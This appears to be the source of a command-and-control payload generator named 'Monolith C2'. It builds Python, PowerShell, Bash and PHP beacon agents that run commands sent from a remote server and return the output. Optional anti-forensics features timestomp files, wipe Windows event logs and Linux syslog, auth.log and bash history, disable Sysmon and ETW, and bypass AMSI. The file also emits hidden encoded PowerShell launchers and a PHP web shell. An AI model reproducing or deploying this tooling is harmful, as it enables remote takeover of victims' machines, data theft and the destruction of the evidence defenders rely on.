"""
C2 Payload Generator
Generate various agent payloads with embedded config
"""
import os
import base64
import random
import string
import zlib
from typing import Dict, Any


class PayloadGenerator:
    """Generate C2 agent payloads"""
    
    def __init__(self, c2_url: str = "http://127.0.0.1:8080/c2/beacon"):
        self.c2_url = c2_url
    
    def generate(self, payload_type: str, options: Dict[str, Any] = None) -> str:
        """Generate payload based on type"""
        options = options or {}
        
        generators = {
            "python": self._gen_python,
            "python_oneliner": self._gen_python_oneliner,
            "powershell": self._gen_powershell,
            "powershell_encoded": self._gen_powershell_encoded,
            "bash": self._gen_bash,
            "php": self._gen_php,
        }
        
        generator = generators.get(payload_type, self._gen_python)
        return generator(options)
    
    def _gen_python(self, options: Dict[str, Any]) -> str:
        """Generate full Python beacon agent with God Mode Anti-Forensics"""
        sleep = options.get("sleep", 30)
        jitter = options.get("jitter", 10)
        
        # God Mode Anti-Forensics seçenekleri
        god_mode = options.get("god_mode", {})
        god_mode_enabled = god_mode.get("enabled", False)
        timestomp = god_mode.get("timestomp", False) if god_mode_enabled else False
        clean_logs = god_mode.get("clean_logs", False) if god_mode_enabled else False
        sysmon_evade = god_mode.get("sysmon_evade", False) if god_mode_enabled else False
        
        # Advanced memory bypass (AMSI, ETW vb.)
        god_mode_code = ""
        if god_mode_enabled:
            if timestomp or clean_logs or sysmon_evade:
                god_mode_code = f'''
# ============ GOD MODE ANTI-FORENSICS ============
import ctypes
import subprocess
import struct

{f'''
# Timestomping
def timestomp(path, atime, mtime, ctime=None):
    import os, time
    ctime = ctime or mtime
    os.utime(path, (atime, mtime))
    try:
        import win32_setfiletime  # Requires pywin32
        win32_setfiletime.SetFileTimes(path, ctime, atime, mtime)
    except:pass

def auto_timestomp():
    import os, glob, random, time
    my_file = sys.argv[0]
    # Random timestamp
    rand_time = time.time() - random.randint(86400*30, 86400*365)
    timestomp(my_file, rand_time, rand_time)
    # Timestomp temp files
    temp_files = glob.glob("/tmp/python*") + glob.glob("C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Temp\\\\*")
    for f in temp_files[:3]:
        try: timestomp(f, rand_time, rand_time)
        except: pass
''' if timestomp else ''}{f'''
# Event Log Cleaner
def clean_event_logs():
    commands = [
        "wevtutil cl System",
        "wevtutil cl Security", 
        "wevtutil cl Application",
        "wevtutil cl \\"Windows PowerShell\\"",
        "wevtutil cl \\"Microsoft-Windows-PowerShell/Operational\\"",
        "powershell -c Clear-EventLog -LogName *",
        "cat /dev/null > /var/log/syslog",
        "cat /dev/null > /var/log/auth.log",
        "cat /dev/null > ~/.bash_history"
    ]
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
        except: pass

def clean_logs_periodic():
    import threading
    def cleaner():
        while True:
            try:
                clean_event_logs()
                time.sleep(300)  # Every 5 min
            except: pass
    t = threading.Thread(target=cleaner, daemon=True)
    t.start()
''' if clean_logs else ''}{f'''
# Sysmon Evasion
def sysmon_evade():
    # Disable Sysmon ETW (Event Tracing for Windows)
    commands = [
        "sc stop sysmon64",
        "sc config sysmon64 start=disabled",
        "Get-Process | Where Name -eq sysmon | Stop-Process -Force",
        "powershell -c $providers = @(Get-EtwTraceProvider | where {{$_.Name -like \\"*Sysmon*\\"}}) | % {{\\\\n    logman stop \\"$($_.Name)\\"  -ets 2>$null\\\\n    logman delete \\"$($_.Name)\\"  -ets 2>$null\\\\n}}"
    ]
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
        except: pass

def disable_amsi():
    # AMSI Bypass
    amsi_bypass = base64.b64decode("SQBuAHYAbwBrAGUALQBSAGUAcwB0AHIAaQBjAHQAZQBkAFMAbwBjAGsAZQB0AEkAbgB0ZXIAcwBlAGMAUwBjAHIAaQBwAHQA").decode()
    try:
        exec(amsi_bypass)
    except: pass

    try:
        import ctypes
        amsi = ctypes.windll.amsi
        amsi.AmsiScanString(b"X"*32, 0, 0, 0)  # Dummy scan
    except: pass
''' if sysmon_evade else ''}'''
        
        payload = f'''#!/usr/bin/env python3
# Monolith C2 Beacon - Auto-generated
import os,sys,json,time,uuid,base64,random,socket,platform,subprocess
try:
    import requests
    R=True
except:
    import urllib.request as urllib
    R=False

{god_mode_code}

C2="{self.c2_url}"
ID=None
S={sleep}
J={jitter}
UA=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"]

def req(m,u,d=None):
    h={{"User-Agent":random.choice(UA),"Content-Type":"application/json"}}
    try:
        if R:
            r=requests.post(u,json=d,headers=h,timeout=30) if m=="POST" else requests.get(u,headers=h,timeout=30)
            return r.json()
        else:
            req=urllib.Request(u,data=json.dumps(d).encode() if d else None,headers=h,method=m)
            return json.loads(urllib.urlopen(req,timeout=30).read().decode())
    except:
        return None

def info():
    return {{"hostname":socket.gethostname(),"username":os.getenv("USER") or os.getenv("USERNAME"),"os":f"{{platform.system()}} {{platform.release()}}","arch":platform.machine(),"pid":os.getpid(),"ip_internal":"127.0.0.1","integrity":"high" if os.geteuid()==0 else "medium"}}

def run(t):
    c,a=t.get("command",""),t.get("args",[])
    try:
        if c=="shell":return subprocess.getoutput(" ".join(a) if a else "whoami"),True
        elif c=="exit":return "bye",False
        else:return subprocess.getoutput(c+" "+" ".join(a)),True
    except Exception as e:return str(e),False

def main():
    global ID,S,J
    
    {f"auto_timestomp()  # Auto-timestomp on startup" if timestomp else ""}
    {f"clean_logs_periodic()  # Start periodic log cleaning" if clean_logs else ""}
    {f"sysmon_evade()  # Disable Sysmon/ETW" if sysmon_evade else ""}
    {f"disable_amsi()  # AMSI bypass" if sysmon_evade else ""}
    
    while True:
        try:
            d=info()
            if ID:d["id"]=ID
            r=req("POST",f"{{C2}}/checkin",d)
            if r:
                if r.get("status")=="registered":ID=r["id"]
                S=r.get("sleep",S);J=r.get("jitter",J)
                for t in r.get("tasks",[]):
                    o,ok=run(t)
                    req("POST",f"{{C2}}/result/{{ID}}",{{"task_id":t["task_id"],"output":o,"success":ok}})
                    if not ok and t.get("command")=="exit":return
        except:pass
        time.sleep(S+random.uniform(-S*J/100,S*J/100))

if __name__=="__main__":main()
'''
        return payload
    
    def _gen_python_oneliner(self, options: Dict[str, Any]) -> str:
        """Generate Python one-liner (base64 encoded)"""
        full_payload = self._gen_python(options)
        compressed = zlib.compress(full_payload.encode())
        encoded = base64.b64encode(compressed).decode()
        
        oneliner = f'python3 -c "import zlib,base64;exec(zlib.decompress(base64.b64decode(\\"{encoded}\\")))"'
        return oneliner
    
    def _gen_powershell(self, options: Dict[str, Any]) -> str:
        """Generate PowerShell beacon with God Mode Anti-Forensics"""
        sleep = options.get("sleep", 30)
        jitter = options.get("jitter", 10)
        
        # God Mode Anti-Forensics seçenekleri
        god_mode = options.get("god_mode", {})
        god_mode_enabled = god_mode.get("enabled", False)
        timestomp = god_mode.get("timestomp", False) if god_mode_enabled else False
        clean_logs = god_mode.get("clean_logs", False) if god_mode_enabled else False
        sysmon_evade = god_mode.get("sysmon_evade", False) if god_mode_enabled else False
        
        god_mode_functions = ""
        main_init = ""
        
        if god_mode_enabled and (timestomp or clean_logs or sysmon_evade):
            god_mode_functions = f'''
{f'''
# Timestomping
function Invoke-Timestomp {{
    param($Path)
    $ref = Get-Item -Path $Path
    $oldTime = $ref.CreationTime
    $newTime = (Get-Date).AddDays(-((Get-Random -Minimum 30 -Maximum 365)))
    Set-ItemProperty -Path $Path -Name CreationTime -Value $newTime
    Set-ItemProperty -Path $Path -Name LastWriteTime -Value $newTime
    Set-ItemProperty -Path $Path -Name LastAccessTime -Value $newTime
}}

function Invoke-AutoTimestomp {{
    try {{
        Invoke-Timestomp -Path $PSCommandPath
        Get-ChildItem "$env:TEMP\\powershell*" -Recurse | ForEach-Object {{
            try {{ Invoke-Timestomp -Path $_.FullName }} catch {{}}
        }}
    }} catch {{}}
}}
''' if timestomp else ''}{f'''
# Event Log Cleaner
function Clear-EventLogs {{
    param([bool]$Continuous = $false)
    $logs = @("System", "Security", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational")
    
    foreach ($log in $logs) {{
        try {{
            wevtutil cl "$log" 2>$null
        }} catch {{}}
    }}
    
    if ($Continuous) {{
        for ($i = 0; $i -lt 120; $i++) {{
            Start-Sleep -Seconds 300
            foreach ($log in $logs) {{
                try {{ wevtutil cl "$log" 2>$null }} catch {{}}
            }}
        }}
    }}
}}
''' if clean_logs else ''}{f'''
# Sysmon/ETW Evasion
function Disable-Sysmon {{
    $sysmonNames = @("Sysmon", "Sysmon64")
    
    foreach ($name in $sysmonNames) {{
        try {{
            Stop-Process -Name $name -Force 2>$null
            sc.exe stop $name 2>$null
            sc.exe config $name start=disabled 2>$null
        }} catch {{}}
    }}
}}

function Disable-ETW {{
    $providers = @(
        "Microsoft-Windows-PowerShell",
        "Microsoft-Windows-PowerShell/Operational",
        "*Sysmon*"
    )
    
    foreach ($provider in $providers) {{
        try {{
            logman stop "$provider" -ets 2>$null
            logman delete "$provider" -ets 2>$null
        }} catch {{}}
    }}
}}

function Invoke-AMSIBypass {{
    try {{
        $ref = [Ref].Assembly.GetTypes() | Where-Object {{ $_.Name -like "*Utilities" }}
        $amsi = $ref[0].GetNestedTypes()[1]
        $method = $amsi.GetMethods()[0]
        $method.Invoke($null, @(1))
    }} catch {{}}
}}
''' if sysmon_evade else ''}'''
            
            main_init = f'''{f"Invoke-AutoTimestomp" if timestomp else ""}
    {f"$logCleanerJob = Start-Job -ScriptBlock {{ Clear-EventLogs -Continuous $true }}" if clean_logs else ""}
    {f"Disable-Sysmon" if sysmon_evade else ""}
    {f"Disable-ETW" if sysmon_evade else ""}
    {f"Invoke-AMSIBypass" if sysmon_evade else ""}
    '''
        
        payload = f'''# Monolith C2 PowerShell Beacon - God Mode
{god_mode_functions}

$C2 = "{self.c2_url}"
$ID = $null
$Sleep = {sleep}
$Jitter = {jitter}

function Get-SystemInfo {{
    @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = [System.Environment]::OSVersion.VersionString
        arch = if ([Environment]::Is64BitProcess) {{ "x64" }} else {{ "x86" }}
        pid = $PID
        ip_internal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -ne "Loopback" }} | Select-Object -First 1).IPAddress
        integrity = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ "high" }} else {{ "medium" }}
    }}
}}

function Invoke-Checkin {{
    param($Data)
    try {{
        $json = $Data | ConvertTo-Json -Compress
        $response = Invoke-RestMethod -Uri "$C2/checkin" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 30
        return $response
    }} catch {{
        return $null
    }}
}}

function Send-Result {{
    param($BeaconId, $Result)
    try {{
        $json = $Result | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$C2/result/$BeaconId" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 30
    }} catch {{}}
}}

function Execute-Task {{
    param($Task)
    $output = ""
    $success = $true
    
    try {{
        switch ($Task.command) {{
            "shell" {{
                $cmd = $Task.args -join " "
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            }}
            "whoami" {{ $output = whoami }}
            "ps" {{ $output = Get-Process | Format-Table | Out-String }}
            "download" {{
                $path = $Task.args[0]
                $output = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
            }}
            "exit" {{ return @{{ output = "bye"; success = $false; exit = $true }} }}
            default {{
                $output = Invoke-Expression ($Task.command + " " + ($Task.args -join " ")) 2>&1 | Out-String
            }}
        }}
    }} catch {{
        $output = $_.Exception.Message
        $success = $false
    }}
    
    return @{{ output = $output; success = $success; exit = $false }}
}}

# Initialize God Mode
{main_init}

# Main Loop
while ($true) {{
    try {{
        $info = Get-SystemInfo
        if ($ID) {{ $info["id"] = $ID }}
        
        $response = Invoke-Checkin -Data $info
        
        if ($response) {{
            if ($response.status -eq "registered") {{
                $ID = $response.id
            }}
            $Sleep = if ($response.sleep) {{ $response.sleep }} else {{ $Sleep }}
            $Jitter = if ($response.jitter) {{ $response.jitter }} else {{ $Jitter }}
            
            foreach ($task in $response.tasks) {{
                $result = Execute-Task -Task $task
                Send-Result -BeaconId $ID -Result @{{
                    task_id = $task.task_id
                    output = $result.output
                    success = $result.success
                }}
                if ($result.exit) {{ exit }}
            }}
        }}
    }} catch {{}}
    
    $jitterAmount = $Sleep * ($Jitter / 100)
    $sleepTime = $Sleep + (Get-Random -Minimum (-$jitterAmount) -Maximum $jitterAmount)
    Start-Sleep -Seconds $sleepTime
}}
'''
        return payload
    
    def _gen_powershell_encoded(self, options: Dict[str, Any]) -> str:
        """Generate base64 encoded PowerShell"""
        ps_payload = self._gen_powershell(options)
        encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
        return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}'
    
    def _gen_bash(self, options: Dict[str, Any]) -> str:
        """Generate Bash beacon"""
        sleep = options.get("sleep", 30)
        
        payload = f'''#!/bin/bash
# Monolith C2 Bash Beacon
C2="{self.c2_url}"
ID=""
SLEEP={sleep}

get_info() {{
    cat <<EOF
{{"hostname":"$(hostname)","username":"$(whoami)","os":"$(uname -s) $(uname -r)","arch":"$(uname -m)","pid":$$,"ip_internal":"$(hostname -I | awk '{{print $1}}')","integrity":"$([ $(id -u) -eq 0 ] && echo high || echo medium)"}}
EOF
}}

checkin() {{
    local data="$1"
    if [ -n "$ID" ]; then
        data=$(echo "$data" | sed 's/}}$/,"id":"'$ID'"}}/')
    fi
    curl -s -X POST "$C2/checkin" -H "Content-Type: application/json" -d "$data" 2>/dev/null
}}

send_result() {{
    local task_id="$1"
    local output="$2"
    output=$(echo "$output" | base64 -w0)
    curl -s -X POST "$C2/result/$ID" -H "Content-Type: application/json" \\
        -d '{{"task_id":"'$task_id'","output":"'$output'","success":true}}' 2>/dev/null
}}

while true; do
    response=$(checkin "$(get_info)")
    
    if [ -n "$response" ]; then
        new_id=$(echo "$response" | grep -o '"id":"[^"]*"' | cut -d'"' -f4)
        [ -n "$new_id" ] && ID="$new_id"
        
        new_sleep=$(echo "$response" | grep -o '"sleep":[0-9]*' | cut -d':' -f2)
        [ -n "$new_sleep" ] && SLEEP=$new_sleep
        
        # Parse and execute tasks (simplified)
        tasks=$(echo "$response" | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
        for cmd in $tasks; do
            case "$cmd" in
                shell|whoami|id|pwd) output=$(eval "$cmd") ;;
                exit) exit 0 ;;
                *) output=$(eval "$cmd" 2>&1) ;;
            esac
        done
    fi
    
    sleep $SLEEP
done
'''
        return payload
    
    def _gen_php(self, options: Dict[str, Any]) -> str:
        """Generate PHP beacon (web shell style)"""
        sleep = options.get("sleep", 30)
        
        payload = f'''<?php
// Monolith C2 PHP Beacon
$c2 = "{self.c2_url}";
$id = null;
$sleep = {sleep};

function getInfo() {{
    return [
        'hostname' => gethostname(),
        'username' => get_current_user(),
        'os' => PHP_OS . ' ' . php_uname('r'),
        'arch' => php_uname('m'),
        'pid' => getmypid(),
        'ip_internal' => $_SERVER['SERVER_ADDR'] ?? '127.0.0.1',
        'integrity' => 'medium'
    ];
}}

function checkin($data) {{
    global $c2;
    $ch = curl_init("$c2/checkin");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}}

function sendResult($beaconId, $taskId, $output) {{
    global $c2;
    $ch = curl_init("$c2/result/$beaconId");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'task_id' => $taskId,
        'output' => $output,
        'success' => true
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}}

function executeTask($task) {{
    $cmd = $task['command'] ?? '';
    $args = $task['args'] ?? [];
    
    switch ($cmd) {{
        case 'shell':
            return shell_exec(implode(' ', $args));
        case 'whoami':
            return shell_exec('whoami');
        case 'pwd':
            return getcwd();
        case 'ls':
            return implode("\\n", scandir($args[0] ?? '.'));
        default:
            return shell_exec($cmd . ' ' . implode(' ', $args));
    }}
}}

// Main loop (for CLI) or single execution (for web)
if (php_sapi_name() === 'cli') {{
    while (true) {{
        $info = getInfo();
        if ($id) $info['id'] = $id;
        
        $response = checkin($info);
        if ($response) {{
            if (isset($response['id'])) $id = $response['id'];
            if (isset($response['sleep'])) $sleep = $response['sleep'];
            
            foreach ($response['tasks'] ?? [] as $task) {{
                $output = executeTask($task);
                sendResult($id, $task['task_id'], $output);
                if ($task['command'] === 'exit') exit(0);
            }}
        }}
        sleep($sleep);
    }}
}} else {{
    // Web mode - single execution
    if (isset($_POST['cmd'])) {{
        echo shell_exec($_POST['cmd']);
    }}
}}
?>
'''
        return payload
    
    def list_types(self) -> list:
        """List available payload types"""
        return [
            {"type": "python", "name": "Python Agent", "desc": "Full-featured Python beacon"},
            {"type": "python_oneliner", "name": "Python One-liner", "desc": "Compressed base64 one-liner"},
            {"type": "powershell", "name": "PowerShell Agent", "desc": "Full PowerShell beacon"},
            {"type": "powershell_encoded", "name": "PowerShell Encoded", "desc": "Base64 encoded PS command"},
            {"type": "bash", "name": "Bash Agent", "desc": "Bash/Shell beacon script"},
            {"type": "php", "name": "PHP Agent", "desc": "PHP beacon/webshell hybrid"},
        ]


# Singleton instance
_generator = None

def get_payload_generator(c2_url: str = None) -> PayloadGenerator:
    """Get payload generator instance"""
    global _generator
    if _generator is None or c2_url:
        _generator = PayloadGenerator(c2_url or "http://127.0.0.1:8080/c2/beacon")
    return _generator
